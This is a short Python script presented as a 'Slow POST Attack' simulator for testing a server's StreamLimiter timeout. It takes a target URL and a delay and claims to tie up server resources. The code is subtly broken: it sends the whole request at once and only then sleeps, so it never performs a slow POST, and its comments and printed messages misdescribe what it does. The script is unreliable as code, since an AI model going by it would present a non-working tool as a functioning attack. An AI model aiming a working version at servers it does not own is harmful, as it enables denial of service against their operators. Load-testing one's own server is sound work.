import requests
import time
import argparse

# Slow POST Attack Script
# Sends POST data slowly to tie up server resources, testing StreamLimiter timeout
# Usage: python slow_post.py --url http://<your-server-ip>/login --delay 50

def slow_post(url, delay):
    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = "username=test&password=test"
        with requests.Session() as s:
            req = s.prepare_request(requests.Request('POST', url, headers=headers, data=data))
            print(f"Sending slow POST to {url}...")
            s.send(req, stream=True)
            time.sleep(delay)  # Delay sending full data
        print("POST sent.")
    except requests.RequestException as e:
        print(f"Error sending POST: {e}")

def main():
    parser = argparse.ArgumentParser(description="Slow POST Attack Simulator")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://<your-server-ip>/login)")
    parser.add_argument("--delay", type=int, default=50, help="Delay in seconds")
    args = parser.parse_args()

    print(f"Starting Slow POST attack on {args.url} with {args.delay}s delay...")
    slow_post(args.url, args.delay)
    print("Attack completed.")

if __name__ == "__main__":
    main()